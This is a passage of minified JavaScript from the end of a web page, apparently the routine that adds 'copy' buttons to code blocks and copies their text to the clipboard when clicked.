s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>